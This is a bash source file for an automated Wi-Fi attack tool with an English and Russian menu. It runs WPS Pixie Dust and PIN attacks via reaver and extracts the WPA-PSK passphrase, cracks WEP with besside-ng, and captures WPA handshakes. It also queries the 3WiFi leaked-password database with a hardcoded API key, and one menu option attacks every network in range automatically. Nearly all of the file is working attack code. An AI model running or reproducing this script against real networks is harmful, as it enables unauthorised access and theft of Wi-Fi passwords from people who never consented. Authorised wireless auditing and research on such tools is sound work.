#!/bin/bash

VERS="20180319" # ♡TH-BKK-release

IFACE=""
REPLY=""


if [ -e "cracked.txt" ]; then
	echo ""
else
	echo "" > cracked.txt
fi

if [ -e "blacklist.txt" ]; then
	echo ""
else
	echo "" > blacklist.txt
fi


if [[ "$(locale | grep LANG | grep -o ru)" == "ru" ]]; then
	LANGUAGE="Russian"
else
	LANGUAGE="English"
fi

source $(dirname $0)/lang/main.sh

function selectInterface {
	clear
	COUNTER=0

	while read -r line ; do
		DEVS[$COUNTER]=$line
		COUNTER=$((COUNTER+1))
	done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")


	if [[ ${#DEVS[@]} == 0 ]]; then
		echo -e ${Lang[Strings1]}
		exit		
	fi

	if [[ ${#DEVS[@]} == 1 ]]; then
		echo -e ${Lang[Strings2]}
		IFACE=${DEVS[0]}
	fi

	if [[ ${#DEVS[@]} -gt 1 ]]; then
		COUNTER=0
		echo ${Lang[Strings3]}
		for i in "${DEVS[@]}";
		do
			echo "$((COUNTER+1)). ${DEVS[COUNTER]}  `sudo airmon-ng | grep ${DEVS[COUNTER]} | awk '{$1=$2=$3=""; print " // " $0}'`"
			COUNTER=$((COUNTER+1))
		done
		read -p "${Lang[Strings4]}" INTNUM	
		IFACE=${DEVS[$((INTNUM-1))]}		
	fi

	if [ $REPLY -eq 11 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function putInMonitorMode {
	if [[ "$IFACE" ]]; then
		clear
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
		REPLY=""
		showMainMenu	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}


function putInManagedMode {
	if [[ "$IFACE" ]]; then
		clear
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
		sudo systemctl start NetworkManager
		REPLY=""
		showMainMenu	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function putInMonitorModePlus {
	if [[ "$IFACE" ]]; then
		clear
		sudo systemctl stop NetworkManager
		sudo airmon-ng check kill
		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

#Perform a test to determine if fcs parameter is needed on wash scanning #from airgeddon
function set_wash_parametrization {

	fcs=""
	readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "$IFACE" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs="-C"
			break
		fi
	done
}

function showWPSNetworks {
	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings7]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
#		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
		echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
		read -p "${Lang[Strings9]}" AIM
		echo ${Lang[Strings10]}
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM"
		echo ${Lang[Strings11]}
		sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
		sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"

	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi

	if [ $REPLY -eq 11 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function PixieDustAattack {

	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings8]}
	if [[ "$IFACE" ]]; then
		sudo timeout 120 xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
		if [[ "$FOUNDWPS" ]]; then
			echo ${Lang[Strings14]}
			echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
			echo '---------------------------------------------------------------------------------------------------------------'
			cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

			COUNTER=0

			while read -r line ; do
				WPSS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $1}' | sed 's/,//')

			for i in "${WPSS[@]}"; 
			do
				echo ""
				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')

				if [[ "$ESSID" ]]; then
					echo ${Lang[Strings12]}"$i ($ESSID)";
					echo ${Lang[Strings11]}
					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
					if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
						echo -e ${Lang[Strings37]}
					else
						sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
		
						sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
						sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E $i | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"

						PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')

						if [[ "$PIN" ]]; then
							echo -e ${Lang[Strings13]}"$PIN"
							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
							echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
							sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
							sleep 3
							echo "wps_reg $i $PIN" | sudo wpa_cli

							echo -e ${Lang[Strings34]}
							sleep 60		
							if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
								echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
							else 
								echo -e ${Lang[Strings36]}
							fi

							sudo airmon-ng check kill

							rm /tmp/suppl.conf
							sudo rm /var/run/wpa_supplicant/$IFACE
	
							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
						else
							echo ${Lang[Strings15]}
						fi					
					fi
				else
					ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
					echo $ESSID
					echo ''
				fi
			done
		else
			echo -e ${Lang[Strings16]}
		fi

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function showOpen {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings17]}
		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
		if [[ "$NOPASS" ]]; then
			echo -e ${Lang[Strings18]}
			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk '{print $19}'| sed 's/,//' | cat -b
		else
			echo -e ${Lang[Strings19]}	
		fi

		sudo rm /tmp/openwifinetworks*

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function attackWEP {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings20]}
		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t WEP -w /tmp/wepwifinetworks --output-forma csv"
		WEP=$(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,')
		if [[ "$WEP" ]]; then
			echo ${Lang[Strings21]}
			cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $19}' | sed 's/,//' | cat -b

			COUNTER=0

			while read -r line ; do
				WEPS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $1}' | sed 's/,//')

			for i in "${WEPS[@]}"; 
			do 
				echo ${Lang[Strings12]}"$i";
				#sudo iw dev "$IFACE" set channel `cat /tmp/wepwifinetworks-01.csv | grep -E "$i" | awk '{print $6}' | sed 's/,//'`
				cd /tmp
				sudo timeout 600 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -b $i -c $(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $6}' | sed 's/,//')"
				WEPCracked=$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}')
				if [[ "$WEPCracked" ]]; then
					echo -e ${Lang[Strings22]}$(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $1}' | sed 's/,//')"\e[0m"
					echo -e ${Lang[Strings23]}$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $3}' | sed 's/,//')
					rm /tmp/besside.log
					rm /tmp/wpa.cap
					rm /tmp/wep.cap
				else
					echo ${Lang[Strings15]}
				fi
				cd
			done
		else
			echo -e ${Lang[Strings24]}
		fi

		sudo rm /tmp/wepwifinetworks*

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function getAllHandshakes {
	if [[ "$IFACE" ]]; then
		echo -e ${Lang[Strings25]}

		sudo timeout 1200 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $IFACE -f 30000 -w autopwner --berlin 1200" &
		sudo timeout 1200 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo zizzania -i $IFACE"
		
		echo ${Lang[Strings26]}
		sleep 1
		sudo pyrit -r "$(ls | grep -E autopwn | grep -E cap | tail -n 1)" analyze


		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
			REPLY=""
			showMainMenu
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function showWPAPassFromPin {

	echo ${Lang[Strings32]}

	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings7]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up

		read -p "${Lang[Strings9]}" AIM
		read -p "${Lang[Strings33]}" PIN
		echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
		sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
		sleep 3
		echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli
		echo -e ${Lang[Strings38]}
		echo -e ${Lang[Strings34]}
		sleep 60		
		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
			echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
		else
			sudo airmon-ng check kill
			sudo rm /var/run/wpa_supplicant/$IFACE
			echo -e ${Lang[Strings36]}
			sudo timeout 180 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
			sleep 3
			echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli	
			echo -e ${Lang[Strings39]}		
			echo -e ${Lang[Strings40]}
			sleep 180

			if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
				echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
			else
				echo -e ${Lang[Strings36]}
			fi
		fi

		rm /tmp/suppl.conf
		sudo airmon-ng check kill
		sudo rm /var/run/wpa_supplicant/$IFACE
		exit
		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
			REPLY=""
			showMainMenu
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function 3WIFI {
	if [[ "$IFACE" ]]; then

		echo ''
		echo ${Lang[Strings42]}

		echo ''
		read  -p "${Lang[Strings41]}" -i "n" isFiveEnable 

		if [[ "$isFiveEnable" == "y" ]]; then
			CH='--channel 1-13,36-165'
		else
			CH=''
		fi

		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $CH --berlin 60000 -w /tmp/3wifi $IFACE"

		FILE='/tmp/3wifi-01.csv'

		echo ${Lang[Strings43]}
		while read -r line ; do

			BSSID=`echo $line | awk '{print $1}' | sed 's/,//'`

			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`

			echo "${Lang[Strings44]} $BSSID ${Lang[Strings45]} $ESSID)"
			echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid='$BSSID`\e[0m" | grep -E -v ':\[\]'
		
		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)

		echo ''
		echo "${Lang[Strings46]}"
		while read -r line ; do

			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`

			if [[ "$ESSID" ]]; then
				echo "${Lang[Strings44]} $ESSID"
				ESSID=`echo $ESSID | sed 's/ /+/g'`
				echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid=*&essid='$ESSID`\e[0m" | grep -E -v ':\[\]'
			fi
		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)

		echo ''

		sudo rm /tmp/3wifi*

		if [ $REPLY -eq 11 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}


clear
COUNTER=0

while read -r line ; do
	DEVS[$COUNTER]=$line
	COUNTER=$((COUNTER+1))
done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")

if [[ ${#DEVS[@]} == 1 ]]; then
	echo -e ${Lang[Strings2]}
	IFACE=${DEVS[0]}
fi


function showMainMenu {

if [[ "$IFACE" ]]; then
	INF=${Lang[Strings27]}$IFACE

	while read -r line ; do
	INF=${INF}${Lang[Strings28]}${line}
	done < <(sudo iw dev | grep -E -A5 "Interface $IFACE" | grep -E "type " | sed "s/		type //")	
else
	INF=${Lang[Strings29]}
fi


if [[ "$LANGUAGE" == "Russian" ]]; then

cat << _EOF_
Информация:
$INF

=======================================================================================
Официальная страница программы (поддержка и обсуждение): https://hackware.ru/?p=2176
=======================================================================================

Меню:
Выберите желаемое действие:
1. Выбрать беспроводной сетевой интерфейс
2. Перевести интерфейс в режим монитора
3. Перевести интерфейс в режим монитора + убить все мешающие ему процессы + завершить NetworkManager
4. Показать открытые Wi-Fi сети
5. Атака на WEP
6. Атака на WPS
7. Атака Pixie Dust (на все ТД с WPS)
8. Получение WPA-PSK пароля при известном WPS PIN
9. Атака на WPA2/WPA
10. Поиск по базе 3WIFI всех точек доступа в диапазоне досягаемости
11. Автоматический аудит Wi-Fi сетей

12. Перевести интерфейс в управляемый режим

0. Для выхода из программы
_EOF_



else

cat << _EOF_
Information:
$INF

=======================================================================================
Script Official Page (support and discussing): https://miloserdov.org/?p=35
=======================================================================================

Menu:
Actions:
1. Select an interface to work with
2. Set the interface in monitor mode
3. Set the interface in monitor mode + kill processes hindering it + kill NetworkManager
4. Show Open Wi-Fi networks
5. WEP Attack
6. WPS Attack
7. Pixie Dust Attack (against every APs with WPS)
8. Reveal WPA-PSK password from known WPS PIN
9. WPA2/WPA Attack
10. Automatic 3WiFi database querying of all detected APs within the range
11. Run all but WPS Attack

12. Put interface in managed mode

0. Exit
_EOF_

fi

read -p "${Lang[Strings30]}" REPLY


if [[ $REPLY =~ ^[0-9]$ ]]; then
	if [[ $REPLY == 0 ]]; then
		echo ${Lang[Strings31]}
		exit
	fi
fi

if [[ $REPLY == 1 ]]; then
	selectInterface
fi

if [[ $REPLY == 2 ]]; then
	putInMonitorMode
fi

if [[ $REPLY == 3 ]]; then
	putInMonitorModePlus
fi

if [[ $REPLY == 4 ]]; then
	showOpen
fi

if [[ $REPLY == 5 ]]; then
	attackWEP
fi

if [[ $REPLY == 6 ]]; then
	showWPSNetworks
fi

if [[ $REPLY == 7 ]]; then
	PixieDustAattack
fi

if [[ $REPLY == 8 ]]; then
	showWPAPassFromPin
fi

if [[ $REPLY == 9 ]]; then
	getAllHandshakes
fi

if [[ $REPLY == 10 ]]; then
	3WIFI
fi

if [[ $REPLY == 11 ]]; then
	putInMonitorModePlus
	showOpen
	attackWEP
	PixieDustAattack
	getAllHandshakes	
fi

if [[ $REPLY == 12 ]]; then
	putInManagedMode
fi

}


showMainMenu
